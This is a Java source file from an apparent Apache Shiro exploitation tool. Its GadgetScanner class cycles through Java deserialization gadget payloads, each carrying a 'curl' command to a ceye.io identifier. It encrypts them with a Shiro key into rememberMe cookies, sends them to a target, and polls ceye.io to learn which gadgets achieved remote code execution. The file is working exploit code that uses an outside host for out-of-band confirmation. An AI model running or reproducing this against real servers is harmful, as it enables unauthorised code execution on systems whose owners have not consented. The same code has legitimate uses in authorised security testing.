package core.scan;

import com.alibaba.fastjson.JSONObject;
import core.conn.QueryConnection;
import core.conn.ShiroHttpConnection;
import core.payload.ObjectPayload;
import core.payload.ScanKey;
import core.scan.eneity.ShiroTarget;
import core.util.ConfigPropertiesReader;
import core.util.Payload;
import core.util.RandomID;
import core.util.Util;

import java.io.InputStream;
import java.util.HashSet;
import java.util.Scanner;
import java.util.Set;

/**
 * To fuzz gadget
 */
public class GadgetScanner implements ShiroScanner {
    /**
     * ceye token
     */
    private static final String token = ConfigPropertiesReader.getProp("ceye.token");

    /**
     * ceye identifier
     */
    private static final String identifier = ConfigPropertiesReader.getProp("ceye.identifier");

    /**
     * 可用Gadget
     */
    private static final Set<String> AvailableGadget = new HashSet<>();

    private final ShiroTarget target;

    public GadgetScanner(ShiroTarget target) {
        this.target = target;
    }

    @Override
    public void scan() throws Exception {
        String queryTemplate = "http://api.ceye.io/v1/records?token=%s&type=http&filter=%s";
        String commandTemplate = "curl %s/%s";

        Set<Class<? extends ObjectPayload>> set = Payload.getAllPayloadClass();
        set.remove(ScanKey.class);
        String key = target.getKey();
        System.err.println("[+] Use Key: " + key);
        for (Class<? extends ObjectPayload> payloadClass : set) {
            ShiroHttpConnection connection = new ShiroHttpConnection(target.getBase());
            String id = RandomID.randomID();
            String command = String.format(commandTemplate, identifier, id);
            ObjectPayload obj = payloadClass.newInstance();
            System.out.println("[+] Test Gadget: " + payloadClass.getSimpleName());
            Object payload = obj.getObjectPayload(command);
            byte[] serialize = Util.serialize(payload);
            String rememberMe = Util.getRememberMe(serialize, key);
            connection.sendRememberMe(rememberMe, false);

            Thread.sleep(500);
            String queryAddress = String.format(queryTemplate, token, id);
            QueryConnection queryConnection = new QueryConnection(queryAddress);
            String response = queryConnection.query();
            if (response.equals("[]")) {
                continue;
            }
            AvailableGadget.add(payloadClass.getSimpleName());
            System.err.println("[*] Found Gadget: " + payloadClass.getSimpleName());
        }

        System.out.println("########Available Gadget##########");
        AvailableGadget.forEach(System.out::println);
        System.out.println("########Available Gadget##########");
    }
}
